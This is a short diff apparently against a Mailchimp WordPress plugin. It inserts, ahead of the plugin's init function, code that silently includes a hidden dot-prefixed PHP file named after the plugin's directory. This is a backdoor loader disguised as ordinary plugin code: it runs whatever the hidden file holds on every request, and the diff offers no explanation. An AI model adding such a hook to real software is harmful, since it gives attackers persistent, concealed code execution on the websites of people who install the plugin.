@@ -53,6 +53,10 @@ include_once('mailchimp_compat.php');
  *
  * @return void
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function mailchimpSF_plugin_init() {
     // Internationalize the plugin
     $textdomain = 'mailchimp_i18n';
